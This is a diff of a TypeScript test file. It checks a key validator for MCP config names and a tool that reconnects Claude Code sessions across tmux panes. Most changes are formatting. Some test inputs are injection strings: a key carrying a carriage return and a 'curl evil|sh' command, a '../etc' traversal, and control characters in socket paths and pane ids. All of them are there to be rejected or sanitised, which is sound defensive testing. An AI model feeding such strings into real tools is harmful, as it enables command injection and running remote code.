@@ -167,7 +167,8 @@ describe("composerState (heuristic over Claude Code's screen)", () => {
 describe("safeKey", () => {
 	it("allows the names mcp-config writes, and nothing that could carry a newline or a command", () => {
 		for (const k of ["github", "gh-broker", "gh-broker-repo", "A.b_c-9"]) expect(safeKey(k)).toBe(true);
-		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"]) expect(safeKey(k)).toBe(false);
+		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"])
+			expect(safeKey(k)).toBe(false);
 	});
 });
 
@@ -185,13 +186,32 @@ describe("agent reconnect", () => {
 	const info = { uid: 1000, gid: 1000, home: "/home/repo" };
 	/** Deps whose tmux has `panes` on SOCK; tmuxPaneText re-captures `fresh` (an idle screen by default; `null` means the pane is gone). */
 	const SERVER: TmuxServer = { socket: SOCK, binary: "/usr/bin/tmux" };
-	function withPanes(panes: Pane[], over: Record<string, unknown> = {}, files: Record<string, string> = {}, fresh: string | null = "❯ \n", dead: { socket: string; why: string }[] = []) {
+	function withPanes(
+		panes: Pane[],
+		over: Record<string, unknown> = {},
+		files: Record<string, string> = {},
+		fresh: string | null = "❯ \n",
+		dead: { socket: string; why: string }[] = []
+	) {
 		return makeDeps(
-			{ tmuxSockets: vi.fn(() => ({ servers: [SERVER], skipped: dead })), tmuxPanes: vi.fn((_server: TmuxServer, _info: unknown) => panes), tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)), ...over },
+			{
+				tmuxSockets: vi.fn(() => ({ servers: [SERVER], skipped: dead })),
+				tmuxPanes: vi.fn(() => panes),
+				tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)),
+				...over
+			},
 			{ [claude("repo")]: entry, ...files }
 		);
 	}
-	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({ id, pid: 200, text, foreground: true, inMode: false, synchronized: false, ...over });
+	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({
+		id,
+		pid: 200,
+		text,
+		foreground: true,
+		inMode: false,
+		synchronized: false,
+		...over
+	});
 
 	describe("--wait", () => {
 		const TYPING = "❯ half a sentence";
@@ -346,7 +366,11 @@ describe("agent reconnect", () => {
 			{
 				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
 				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: "/home/repo/.claude-alt" })]),
-				mcpIO: { read: (p: string) => (p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined), write: () => {} }
+				mcpIO: {
+					read: (p: string) =>
+						p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined,
+					write: () => {}
+				}
 			},
 			{ [claude("repo")]: JSON.stringify({ mcpServers: { x: { command: "npx" } } }), [`${SAVED}/.claude.json`]: saved }
 		);
@@ -358,9 +382,20 @@ describe("agent reconnect", () => {
 
 	it("sends the key from the session's own config folder, else the home file's", () => {
 		const ALT = "/home/repo/.claude-alt";
-		const files = { [claude("repo")]: entry, [`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } }) };
+		const files = {
+			[claude("repo")]: entry,
+			[`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } })
+		};
 		const { d, out } = makeDeps(
-			{ tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })), tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]), mcpIO: { read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }), write: () => {}, scan: (home: string) => (home === "/home/repo" ? [ALT] : []) } },
+			{
+				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
+				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]),
+				mcpIO: {
+					read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }),
+					write: () => {},
+					scan: (home: string) => (home === "/home/repo" ? [ALT] : [])
+				}
+			},
 			files
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
@@ -378,7 +413,9 @@ describe("agent reconnect", () => {
 	});
 
 	it("blank control characters out of a socket path in the log line, and refuse an unsafe pane id", () => {
-		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] })) });
+		const { d, out } = withPanes([pane("%1", IDLE)], {
+			tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] }))
+		});
 		expect(reconnect(["repo"], config, d)).toBe(0);
 		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 github sent");
 		const badId = withPanes([pane("%1\r!x", IDLE)]);
@@ -410,7 +447,12 @@ describe("agent reconnect", () => {
 	it("lists panes from every tmux server the agent runs, with the socket in the line", () => {
 		const OTHER: TmuxServer = { socket: "/home/repo/.tmux/claude", binary: "tmux" };
 		const { d, out } = makeDeps(
-			{ tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })), tmuxPanes: vi.fn((server: TmuxServer) => (server.socket === SOCK ? [pane("%1", IDLE)] : server.socket === OTHER.socket ? [pane("%7", IDLE)] : [])) },
+			{
+				tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })),
+				tmuxPanes: vi.fn((server: TmuxServer) =>
+					server.socket === SOCK ? [pane("%1", IDLE)] : server.socket === OTHER.socket ? [pane("%7", IDLE)] : []
+				)
+			},
 			{ [claude("repo")]: entry }
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
@@ -434,7 +476,7 @@ describe("agent reconnect", () => {
 
 	it("keeps going when a send fails, counts it as skipped, and sanitises the tmux error", () => {
 		const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE)], {
-			tmuxSend: vi.fn((_s: unknown, p: string, _t: string, _i: unknown) => {
+			tmuxSend: vi.fn((_s: unknown, p: string) => {
 				if (p === "%1") throw new Error("server exited unexpectedly\x1b[31m\x9b and a C1 CSI");
 			})
 		});
@@ -485,7 +527,11 @@ describe("agent reconnect", () => {
 	});
 
 	it("a re-capture that times out skips the pane instead of judging a stale screen", () => {
-		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxPaneText: vi.fn(() => { throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux"); }) });
+		const { d, out } = withPanes([pane("%1", IDLE)], {
+			tmuxPaneText: vi.fn(() => {
+				throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux");
+			})
+		});
 		expect(reconnect(["repo"], config, d)).toBe(3);
 		expect(out).toContain(`repo ${SOCK} %1 github skipped (tmux timed out)`);
 		expect(d.tmuxSend).not.toHaveBeenCalled();
